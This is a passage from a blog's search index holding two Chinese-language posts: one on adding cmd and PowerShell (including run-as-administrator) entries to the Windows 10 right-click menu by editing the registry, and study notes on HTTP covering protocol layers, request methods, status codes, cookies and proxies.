<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>win10右键添加cmd和powershell</title>
      <link href="2021/05/16/win10-you-jian-tian-jia-cmd/"/>
      <url>2021/05/16/win10-you-jian-tian-jia-cmd/</url>
      
        <content type="html"><![CDATA[<h2 id="win10右键添加cmd和powershell"><a href="#win10右键添加cmd和powershell" class="headerlink" title="win10右键添加cmd和powershell"></a>win10右键添加cmd和powershell</h2><p>两种方式，一种改原生的注册表，一种添加新的注册表</p><h3 id="1-改原生的注册表"><a href="#1-改原生的注册表" class="headerlink" title="1. 改原生的注册表"></a>1. 改原生的注册表</h3><p><code>win+r</code>输入<code>register</code>打开注册表</p><p><img src="https://z3.ax1x.com/2021/05/16/gcVHG8.png" alt="gcVHG8.png"></p><ul><li><p>cmd</p><p>找到<code>计算机\HKEY_CLASSES_ROOT\Directory\Background\shell\cmd</code></p><p>将<code>HideBasedOnVelocityId</code>改为<code>ShowBasedOnVelocityId</code></p></li><li><p>powershell</p><p>找到<code>计算机\HKEY_CLASSES_ROOT\Directory\Background\shell\Powershell</code></p><p>将<code>HideBasedOnVelocityId</code>改为<code>ShowBasedOnVelocityId</code></p></li></ul><p>因为<code>Extended</code>这个二进制值存在，需要shift+右键才能显示，要使用右键直接显示，可以将这个二进制值删除</p><p>这个时候可能会因为权限原因修改失败，查看下文解决方法</p><h3 id="2-添加新的注册表"><a href="#2-添加新的注册表" class="headerlink" title="2.添加新的注册表"></a>2.添加新的注册表</h3><p>创建如图几个项</p><p><img src="https://z3.ax1x.com/2021/05/16/gcZCGT.png" alt="gcZCGT.png"></p><p>这里直接演示添加以管理员打开，非管理员打开只需要做一些改动</p><ul><li><p>powershell</p><p>在powershella下进行如下操作</p><p>新建字符串值<code>Extended</code> 值为空</p><p>新建字符串值<code>MUIVerb</code>值为<code>在此处以管理员打开powershell窗口</code></p><p>新建字符串值<code>NoWorkingDirectory</code>值为空</p><p>新建DWORD值<code>ShowBasedOnVelocityId</code>值为<code>639bc8</code></p><p><img src="https://z3.ax1x.com/2021/05/16/gcZEL9.png" alt="gcZEL9.png"></p><p>对command写入数据</p><p><img src="https://z3.ax1x.com/2021/05/16/gcZ9iV.png" alt="gcZ9iV.png"></p><pre class=" language-shell"><code class="language-shell">powershell.exe -command Start-Process powershell -ArgumentList \"-noexit\",\"Set-Location -literalPath '%V'\" -Verb runAspowershell.exe -command Start-Process powershell开始运行powershell-ArgumentList \"-noexit\",\"Set-Location -literalPath '%V'\"选项 noexit不退出  Set-Location -literalPath '%V'定位-Verb runAs 以管理员运行cmd</code></pre></li><li><p>cmd</p><p>必须是<code>runas</code>名字不能改，在下面新建DWORD值<code>ShowBasedOnVelocityId</code>值为<code>639bc8</code></p><p>对command写入数据</p><p><img src="https://z3.ax1x.com/2021/05/16/gcZZZR.png" alt="gcZZZR.png"></p><pre class=" language-shell"><code class="language-shell">cmd.exe /s /k pushd "%V"</code></pre><p>如果要以普通用户打开，则可以将<code>runas</code>换为其他名字，再添加</p></li></ul><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>右击cmd-&gt;权限</p><p><img src="https://z3.ax1x.com/2021/05/16/gcVbRS.png" alt="gcVbRS.png"></p><p>点击右下角高级</p><p><img src="https://z3.ax1x.com/2021/05/16/gcVqxg.png" alt="gcVqxg.png"></p><p>点击右上所有者旁的更改</p><p><img src="https://z3.ax1x.com/2021/05/16/gcVxZn.png" alt="gcVxZn.png"></p><p>输入<code>Administrators</code>点击检查名称-&gt;确定</p><p><img src="https://z3.ax1x.com/2021/05/16/gcVzaq.png" alt="gcVzaq.png"></p><p>双击<code>Administrators</code></p><p><img src="https://z3.ax1x.com/2021/05/16/gcZSI0.png" alt="gcZSI0.png"></p><p>勾选完全控制，一直确定</p><h3 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h3><ul><li><p><code>Extended</code></p><p>设置该值时，需要shift+右键显示</p><p>不设置直接右键显示</p></li><li><p><code>MUIVerb</code></p><p>设置的值会显示在右键上</p><p>不设置显示文件夹名</p></li><li><p><code>NoWorkingDirectory</code></p><p>不知道</p></li><li><p><code>ShowBasedOnVelocityId</code></p><p>固定为<code>639bc8</code></p></li></ul><h3 id="一键操作"><a href="#一键操作" class="headerlink" title="一键操作"></a>一键操作</h3><p>将下面代码保存为xxx.reg的注册表文件，编码为ANSI，点击运行</p><p>以管理员方式运行powershell</p><pre class=" language-reg"><code class="language-reg">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\Background\shell\powershella]"Extended"="""MUIVerb"="在此处以管理员打开powershell窗口""ShowBasedOnVelocityId"=dword:00639bc8"NoWorkingDirectory"=""[HKEY_CLASSES_ROOT\Directory\Background\shell\powershella\command]@="powershell.exe -command Start-Process powershell -ArgumentList \\\"-noexit\\\",\\\"Set-Location -literalPath '%V'\\\" -Verb runAs"</code></pre><p>以管理员方式运行cmd</p><pre class=" language-reg"><code class="language-reg">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\Background\shell\runas]"ShowBasedOnVelocityId"=dword:00639bc8[HKEY_CLASSES_ROOT\Directory\Background\shell\runas\command]@="cmd.exe /s /k pushd \"%V\""</code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP学习</title>
      <link href="2021/04/23/http-xue-xi/"/>
      <url>2021/04/23/http-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="web协议"><a href="#web协议" class="headerlink" title="web协议"></a>web协议</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>Web 使用一种名为 HTTP（HyperText Transfer Protocol，超文本传输协议 ）的协议作为规范，完成从客户端到服务器端等一系列运作流程。</p><p>1997 年  1 月公布的  HTTP/1.1 是目前主流的  HTTP 协议版本。</p><h3 id="TCP-IP协议簇"><a href="#TCP-IP协议簇" class="headerlink" title="TCP/IP协议簇"></a>TCP/IP协议簇</h3><p><img src="https://z3.ax1x.com/2021/03/24/6biYzq.png" alt="6biYzq.png"></p><h4 id="TCP-IP分层"><a href="#TCP-IP分层" class="headerlink" title="TCP/IP分层"></a>TCP/IP分层</h4><h5 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h5><p>FTP（FileTransfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统）</p><p>HTTP</p><h5 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h5><p>TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）</p><h5 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h5><p>网络层所起的作用就是在众多的选项内选择一条传输路线</p><h5 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h5><p>用来处理连接网络的硬件部分</p><h4 id="TCP-IP-通信传输流"><a href="#TCP-IP-通信传输流" class="headerlink" title="TCP/IP 通信传输流"></a>TCP/IP 通信传输流</h4><p><img src="https://z3.ax1x.com/2021/03/24/6bi0wF.png" alt="6bi0wF.png"></p><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p>不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议（protocol）。</p><h3 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h3><p>IP（Internet Protocol）网际协议位于网络层</p><p>IP 协议的作用是把各种数据包传送给对方。</p><p>P 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC地址基本上不会更改。</p><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC 地址。</p><h4 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择"></a>路由选择</h4><p><img src="https://z3.ax1x.com/2021/03/24/6biROK.png" alt="6biROK.png"></p><h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><p>TCP 位于传输层，提供可靠的字节流服务</p><h4 id="tcp三次握手"><a href="#tcp三次握手" class="headerlink" title="tcp三次握手"></a>tcp三次握手</h4><p><img src="https://z3.ax1x.com/2021/03/24/6bizkQ.png" alt="6bizkQ.png"></p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS（Domain Name System）服务是和 HTTP 协议一样位于应用层的<br>协议。它提供域名到 IP 地址之间的解析服务。</p><p><img src="https://z3.ax1x.com/2021/03/24/6bFFXV.png" alt="6bFFXV.png"></p><h3 id="各协议关系"><a href="#各协议关系" class="headerlink" title="各协议关系"></a>各协议关系</h3><p><img src="https://z3.ax1x.com/2021/03/24/6bFE0U.png" alt="6bFE0U.png"></p><h3 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h3><p>URI 是 Uniform Resource Identifier 的缩写。</p><p>URI 用字符串标识某一互联网资源，而 URL表示资源的地点（互联网上所处的位置）</p><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p><img src="https://z3.ax1x.com/2021/03/24/6bFmtJ.png" alt="6bFmtJ.png"></p><p>as：</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">ftp:</span>//ftp.is.co.za/rfc/rfc1808.txt<span class="token header-name keyword">http:</span>//www.ietf.org/rfc/rfc2396.txt<span class="token header-name keyword">ldap:</span>//[2001:db8::7]/c=GB?objectClass?one<span class="token header-name keyword">mailto:</span>John.Doe@example.com<span class="token header-name keyword">news:</span>comp.infosystems.www.servers.unix<span class="token header-name keyword">tel:</span>+1-816-555-1212<span class="token header-name keyword">telnet:</span>//192.0.2.16:80/<span class="token header-name keyword">urn:</span><span class="token header-name keyword">oasis:</span><span class="token header-name keyword">names:</span><span class="token header-name keyword">specification:</span><span class="token header-name keyword">docbook:</span><span class="token header-name keyword">dtd:</span><span class="token header-name keyword">xml:</span>4.1.2</code></pre><hr><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="S-B客服端与服务器端的交互"><a href="#S-B客服端与服务器端的交互" class="headerlink" title="S-B客服端与服务器端的交互"></a>S-B客服端与服务器端的交互</h3><p>在两台计算机之间使用 HTTP 协议通信时，在一条通信线路上必定有一端是客户端，另一端则是服务器端。</p><p>HTTP 是不保存状态的协议</p><h3 id="请求-响应"><a href="#请求-响应" class="headerlink" title="请求-响应"></a>请求-响应</h3><p><img src="https://z3.ax1x.com/2021/03/24/6bFlX6.png" alt="6bFlX6.png"></p><p>请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的。</p><p><img src="https://z3.ax1x.com/2021/03/24/6bFG7D.png" alt="6bFG7D.png"></p><p>响应报文</p><p><img src="https://z3.ax1x.com/2021/03/24/6bFsHS.png" alt="6bFsHS.png">URI请求</p><p><img src="https://z3.ax1x.com/2021/03/24/6bFR9s.png" alt="6bFR9s.png"></p><h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>GET ：获取资源<br>GET 方法用来请求访问已被 URI 识别的资源。指定的资源经服务器 端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保 持原样返回；如果是像 CGI（Common Gateway Interface，通用网关接 口）那样的程序，则返回经过执行后的输出结果。</p><p>请求：</p><pre class=" language-http"><code class="language-http">GET /index.html HTTP/1.1 <span class="token header-name keyword">Host:</span> www.hackr.jp</code></pre><p>响应：</p><pre class=" language-http"><code class="language-http">返回  index.html 的页面资源</code></pre><h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>POST：传输实体主体<br>POST 方法用来传输实体的主体。<br>虽然用 GET 方法也可以传输实体的主体，但一般不用 GET 方法进行 传输，而是用 POST 方法。虽说 POST 的功能与 GET 很相似，但 POST 的主要目的并不是获取响应的主体内容。</p><p>请求：</p><pre class=" language-http"><code class="language-http">POST /submit.cgi HTTP/1.1 <span class="token header-name keyword">Host:</span> www.hackr.jp <span class="token header-name keyword">Content-Length:</span> 1560（1560字节的数据）</code></pre><p>响应：</p><pre class=" language-http"><code class="language-http">返回  submit.cgi 接收数据的处理结果 </code></pre><h4 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h4><p>PUT：传输文件<br>PUT 方法用来传输文件。就像 FTP 协议的文件上传一样，要求在请 求报文的主体中包含文件内容，然后保存到请求 URI 指定的位置。 </p><p>请求：</p><pre class=" language-http"><code class="language-http">PUT /example.html HTTP/1.1 <span class="token header-name keyword">Host:</span> www.hackr.jp <span class="token header-name keyword">Content-Type:</span> text/html <span class="token header-name keyword">Content-Length:</span> 1560（1560 字节的数据</code></pre><p>响应：</p><pre class=" language-http"><code class="language-http">响应返回状态码  204 No Content（比如  ：该  html 已存在于服务器上） </code></pre><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>HEAD：获得报文首部<br>HEAD 方法和  GET 方法一样，只是不返回报文主体部分。用于确认 URI 的有效性及资源更新的日期时间等。</p><p>请求：</p><pre class=" language-http"><code class="language-http">HEAD /index.html HTTP/1.1 <span class="token header-name keyword">Host:</span> www.hackr.jp </code></pre><p>响应：</p><pre class=" language-http"><code class="language-http">返回index.html有关的响应首部 </code></pre><h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>DELETE：删除文件<br>DELETE 方法用来删除文件，是与 PUT 相反的方法。DELETE 方法按 请求 URI 删除指定的资源。</p><p>请求：</p><pre class=" language-http"><code class="language-http">DELETE /example.html HTTP/1.1 <span class="token header-name keyword">Host:</span> www.hackr.jp </code></pre><p>响应：</p><pre class=" language-http"><code class="language-http">响应返回状态码  204 No Content（比如  ：该  html 已从该服务器上删除） </code></pre><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><p>OPTIONS：询问支持的方法<br>OPTIONS 方法用来查询针对请求 URI 指定的资源支持的方法。 </p><p>请求：</p><pre class=" language-http"><code class="language-http">OPTIONS * HTTP/1.1 <span class="token header-name keyword">Host:</span> www.hackr.jp </code></pre><p>响应：</p><pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">200 OK </span></span><span class="token header-name keyword">Allow:</span> GET, POST, HEAD, OPTIONS （返回服务器支持的方法） </code></pre><h4 id="TRACK"><a href="#TRACK" class="headerlink" title="TRACK"></a>TRACK</h4><p>TRACE：追踪路径<br>TRACE 方法是让  Web 服务器端将之前的请求通信环回给客户端的方 法。<br>发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服 务器端就将该数字减 1，当数值刚好减到 0 时，就停止继续传输，最 后接收到请求的服务器端则返回状态码 200 OK 的响应</p><p>请求：</p><pre class=" language-http"><code class="language-http">TRACE / HTTP/1.1 <span class="token header-name keyword">Host:</span> hackr.jp <span class="token header-name keyword">Max-Forwards:</span> 2 </code></pre><p>响应：</p><pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">200 OK </span></span><span class="token header-name keyword">Content-Type:</span> message/http <span class="token header-name keyword">Content-Length:</span> 1024 TRACE / HTTP/1.1 <span class="token header-name keyword">Host:</span> hackr.jp <span class="token header-name keyword">Max-Forwards:</span> 2（返回响应包含请求内容） </code></pre><h4 id="CONNECT"><a href="#CONNECT" class="headerlink" title="CONNECT"></a>CONNECT</h4><p>CONNECT：要求用隧道协议连接代理<br>CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协 议进行 TCP 通信。主要使用 SSL（Secure Sockets Layer，安全套接 层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容 加 密后经网络隧道传输。<br>CONNECT 方法的格式如下所示。 </p><p>CONNECT 代理服务器名:端口号    HTTP版本 </p><p>请求：</p><pre class=" language-http"><code class="language-http">CONNECT proxy.hackr.jp:8080 HTTP/1.1 <span class="token header-name keyword">Host:</span> proxy.hackr.jp </code></pre><p>响应：</p><pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">200 OK（之后进入网络隧道） </span></span></code></pre><p><img src="https://z3.ax1x.com/2021/03/24/6bFoHU.png" alt="6bFoHU.png"></p><h3 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h3><p>持久连接旨在建立 1 次 TCP 连接后进行多次请求和响应的交互</p><h4 id="管线化"><a href="#管线化" class="headerlink" title="管线化"></a>管线化</h4><p>不等待响应，直接发送下一个请求</p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p><img src="https://z3.ax1x.com/2021/03/24/6bFLC9.png" alt="6bFLC9.png"></p><p><img src="https://z3.ax1x.com/2021/03/24/6bkCUe.png" alt="6bkCUe.png"></p><p>请求：</p><pre class=" language-http"><code class="language-http">GET /image/ HTTP/1.1<span class="token header-name keyword">Host:</span> hackr.jp<span class="token header-name keyword">Cookie:</span> sid=1342077140226724</code></pre><p>响应：</p><pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">200 OK</span></span><span class="token header-name keyword">Date:</span> Thu, 12 Jul 2012 07:12:20 GMT<span class="token header-name keyword">Server:</span> Apache＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMT＞<span class="token header-name keyword">Content-Type:</span> text/plain; charset=UTF-8</code></pre><hr><h2 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p><img src="https://z3.ax1x.com/2021/03/24/6bkmb8.png" alt="6bkmb8.png"></p><p><img src="https://z3.ax1x.com/2021/03/24/6bkM5Q.png" alt="6bkM5Q.png"></p><p><img src="https://z3.ax1x.com/2021/03/24/6bk5RA.png" alt="6bk5RA.png"></p><h3 id="压缩传输"><a href="#压缩传输" class="headerlink" title="压缩传输"></a>压缩传输</h3><p>常用的内容编码有以下几种：<br>gzip（GNU zip）<br>compress（UNIX 系统的标准压缩）<br>deflate（zlib）<br>identity（不进行编码）</p><h3 id="分割发送的分块传输编码"><a href="#分割发送的分块传输编码" class="headerlink" title="分割发送的分块传输编码"></a>分割发送的分块传输编码</h3><p>分块传输编码会将实体主体分成多个部分（块）。每一块都会用十六 进制来标记块的大小，而实体主体的最后一块会使用“0(CR+LF)”来标记。<br>使用分块传输编码的实体主体会由接收的客户端负责解码，恢复到编 码前的实体主体。</p><h3 id="发送多种数据的多部分对象集合"><a href="#发送多种数据的多部分对象集合" class="headerlink" title="发送多种数据的多部分对象集合"></a>发送多种数据的多部分对象集合</h3><ul><li><p>multipart/form-data（文件上传时）</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=AaB03x--AaB03x<span class="token header-name keyword">Content-Disposition:</span> form-data; name="field1"Joe Blow--AaB03x<span class="token header-name keyword">Content-Disposition:</span> form-data; name="pics"; filename="file1.txt"<span class="token header-name keyword">Content-Type:</span> text/plain...（file1.txt的数据）...--AaB03x--</code></pre></li><li><p>multipart/byteranges</p><pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">206 Partial Content</span></span><span class="token header-name keyword">Date:</span> Fri, 13 Jul 2012 02:45:26 GMT<span class="token header-name keyword">Last-Modified:</span> Fri, 31 Aug 2007 02:02:20 GMT<span class="token header-name keyword">Content-Type:</span> multipart/byteranges; boundary=THIS_STRING_SEPARATES--THIS_STRING_SEPARATES<span class="token header-name keyword">Content-Type:</span> application/pdf<span class="token header-name keyword">Content-Range:</span> bytes 500-999/8000...（范围指定的数据）...--THIS_STRING_SEPARATES<span class="token header-name keyword">Content-Type:</span> application/pdf<span class="token header-name keyword">Content-Range:</span> bytes 7000-7999/8000...（范围指定的数据）...--THIS_STRING_SEPARATES--</code></pre></li></ul><p>使用 boundary 字符串来划分多部分对象集合指明的各类实体。在boundary 字符串指定的各个实体的起始行之前插入“–”标记（例如：–AaB03x、–THIS_STRING_SEPARATES），而在多部分对象集合对应的字符串的最后插入“–”标记（例如：–AaB03x–、–THIS_STRING_SEPARATES–）作为结束。</p><h3 id="获取部分内容的范围请求（分段请求）"><a href="#获取部分内容的范围请求（分段请求）" class="headerlink" title="获取部分内容的范围请求（分段请求）"></a>获取部分内容的范围请求（分段请求）</h3><p><img src="https://z3.ax1x.com/2021/03/24/6bk0PJ.png" alt="6bk0PJ.png"></p><p>从一开始到  3000 字节和  5000~7000 字节，8000到之后全部的多重范围</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Range:</span> bytes=-3000, 5000-7000 ,8000-</code></pre><h3 id="内容协商"><a href="#内容协商" class="headerlink" title="内容协商"></a>内容协商</h3><p>内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然 后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字 符集、编码方式等作为判断的基准。</p><p>参照头</p><pre class=" language-http"><code class="language-http">Accept Accept-CharsetAccept-Encoding Accept-Language Content-Language</code></pre><p>内容协商技术</p><ul><li>服务器驱动协商</li><li>客户端驱动协商</li><li>透明协商</li></ul><h2 id="HTTP返回状态码"><a href="#HTTP返回状态码" class="headerlink" title="HTTP返回状态码"></a>HTTP返回状态码</h2><h3 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h3><p><img src="https://z3.ax1x.com/2021/04/12/c0oHzj.png" alt="c0oHzj.png"></p><h4 id="2XX"><a href="#2XX" class="headerlink" title="2XX"></a>2XX</h4><p>2XX 的响应结果表明请求被正常处理了</p><h5 id="200OK"><a href="#200OK" class="headerlink" title="200OK"></a>200OK</h5><p>表示从客户端发来的请求在服务器端被正常处理了，get请求回返回实体，head请求返回实体首部</p><h5 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h5><p>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。（浏览器不更新页面）</p><h5 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h5><p>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。</p><h4 id="3XX重定向"><a href="#3XX重定向" class="headerlink" title="3XX重定向"></a>3XX重定向</h4><p>3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p><h5 id="301-Moved-Permanently"><a href="#301-Moved-Permanently" class="headerlink" title="301 Moved Permanently"></a>301 Moved Permanently</h5><p>永久性重定向。该状态码表示请求的资源已被分配了新的 URI，以后应使用资源现在所指的 URI。也就是说，如果已经把资源对应的 URI保存为书签了，这时应该按 Location 首部字段提示的 URI 重新保存。</p><h5 id="302-Found"><a href="#302-Found" class="headerlink" title="302 Found"></a>302 Found</h5><p>临时性重定向。该状态码表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。不更新书签，仍保留产生302的url</p><h5 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h5><p>该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET方法定向获取请求的资源。例如，post方法请求时，处理结果希望客服端采用get方法获取资源</p><h5 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h5><p>该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。</p><p>附带条件的请求是指采用 GET方法的请求报文中包含 If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since 中任一首部。</p><h5 id="307-Temporary-Redirect"><a href="#307-Temporary-Redirect" class="headerlink" title="307 Temporary Redirect"></a>307 Temporary Redirect</h5><h4 id="4XX-客户端错误"><a href="#4XX-客户端错误" class="headerlink" title="4XX 客户端错误"></a>4XX 客户端错误</h4><p>4XX 的响应结果表明客户端是发生错误的原因所在。</p><h5 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h5><p>该状态码表示请求报文中存在语法错误。修改报文再发送。和200异曲同工</p><h5 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h5><p>该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。</p><p>返回含有 401 的响应必须包含一个适用于被请求资源的 WWW-Authenticate 首部用以质询（challenge）用户信息。</p><p>首次返回一个认证框，再返回就是认证失败</p><h5 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h5><p>该状态码表明对请求资源的访问被服务器拒绝了。</p><h5 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h5><p>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p><h4 id="5XX-服务器错误"><a href="#5XX-服务器错误" class="headerlink" title="5XX 服务器错误"></a>5XX 服务器错误</h4><p>5XX 的响应结果表明服务器本身发生错误。</p><h5 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h5><p>该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web应用存在的 bug 或某些临时的故障。</p><h5 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h5><p>该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</p><h3 id="samll-tips"><a href="#samll-tips" class="headerlink" title="samll_tips"></a>samll_tips</h3><p>不少返回的状态码响应都是错误的，但是用户可能察觉不到这点。</p><h2 id="与-HTTP-协作的-Web-服务器"><a href="#与-HTTP-协作的-Web-服务器" class="headerlink" title="与 HTTP 协作的 Web 服务器"></a>与 HTTP 协作的 Web 服务器</h2><h3 id="用单台虚拟主机实现多个域名"><a href="#用单台虚拟主机实现多个域名" class="headerlink" title="用单台虚拟主机实现多个域名"></a>用单台虚拟主机实现多个域名</h3><p>一台服务器托管了两个域名，<a href="http://www.hacker.com,www.hacker2.com,两个域名托管在一个虚拟机,则dns解析后ip相同,两个域名会访问一个ip.在相同的/">www.hacker.com,www.hacker2.com，两个域名托管在一个虚拟机，则DNS解析后IP相同，两个域名会访问一个IP。在相同的</a> IP 地址下，由于虚拟主机可以寄存多个不同主机名和域名的 Web 网站，因此在发送 HTTP 请求时，必须在 Host 首部内完整指定主机名或域名的 URI。</p><h3 id="通信数据转发程序-：代理、网关、隧道"><a href="#通信数据转发程序-：代理、网关、隧道" class="headerlink" title="通信数据转发程序 ：代理、网关、隧道"></a>通信数据转发程序 ：代理、网关、隧道</h3><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。</p><p>代理服务器的基本行为就是接收客户端发送的请求后转发给其他服务器。代理不改变请求 URI，会直接发送给前方持有资源的目标服务器。</p><p><img src="https://z3.ax1x.com/2021/04/20/cT5HG8.png" alt="cT5HG8.png"></p><p>每次通过代理服务器转发请求或响应时，会追加写入 Via 首部信息</p><h5 id="代理方法"><a href="#代理方法" class="headerlink" title="代理方法"></a>代理方法</h5><p>1.缓存代理</p><p>代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。再次收到相同的资源请求就会返回代理上缓存的资源。</p><p>2.透明代理</p><p>转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。</p><h4 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h4><p>网关是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关。</p><p>网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非 HTTP 协议服务。<br>利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。</p><p><img src="https://z3.ax1x.com/2021/04/20/cT5qxg.png" alt="cT5qxg.png"></p><h4 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h4><p>隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序。</p><p>隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。<br>隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。</p><p><img src="https://z3.ax1x.com/2021/04/20/cT5OMQ.png" alt="cT5OMQ.png"></p><h3 id="保存资源的缓存"><a href="#保存资源的缓存" class="headerlink" title="保存资源的缓存"></a>保存资源的缓存</h3><p>缓存服务器的优势在于利用缓存可避免多次从源服务器转发资源。因此客户端可就近从缓存服务器上获取资源，而源服务器也不必多次处理相同的请求了。</p><h4 id="缓存的有效期限"><a href="#缓存的有效期限" class="headerlink" title="缓存的有效期限"></a>缓存的有效期限</h4><p>即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性。若判断缓存失效，缓存服务器将会再次从源服务器上获取“新”资源。</p><h4 id="客户端的缓存"><a href="#客户端的缓存" class="headerlink" 